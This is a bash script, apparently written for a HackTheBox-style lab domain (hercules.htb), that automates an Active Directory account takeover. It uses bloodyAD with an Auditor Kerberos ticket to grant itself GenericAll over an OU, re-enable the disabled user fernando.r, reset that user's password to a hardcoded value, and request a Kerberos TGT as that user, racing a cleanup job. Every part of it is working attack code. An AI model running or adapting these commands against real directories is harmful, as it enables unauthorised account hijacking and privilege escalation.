#!/usr/bin/env bash
# dirty-nando.sh
# Automate the race condition against the cleanup script

set -o errexit
set -o nounset
set -o pipefail

# enable tracing only if you export DEBUG=1 (careful: will print secrets)
if [[ "${DEBUG:-0}" == "1" ]]; then
  set -x
fi

TARGET_IP='10.129.115.82'
KRB5CCNAME="${KRB5CCNAME:-./auditor.ccache}"
FERNANDO_PASS="${FERNANDO_PASS:-SecretMyth123!}"  # consider exporting instead

# 1. Auditor ⤏ GenericAll ⤏ FOREST MIGRATION
bloodyAD --host dc.hercules.htb -d hercules.htb \
    -u Auditor -k ccache="$KRB5CCNAME" \
    add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor || true

# 2. Enable Fernando.R
bloodyAD --host dc.hercules.htb -d hercules.htb \
    -u Auditor -k ccache=./auditor.ccache \
    remove uac 'fernando.r' -f ACCOUNTDISABLE || true

# 3. Reset Password | Fernando.R
bloodyAD --host dc.hercules.htb -d hercules.htb \
    -u Auditor -k ccache="$KRB5CCNAME" \
    set password 'fernando.r' "$FERNANDO_PASS" || true

# 4. Generate TGT | Fernando.R
getTGT.py hercules.htb/'fernando.r':"$FERNANDO_PASS" -dc-ip $TARGET_IP && echo "[*] Dirty Nando is a Success!!!" || echo "[-] Race condition lost. Run it again."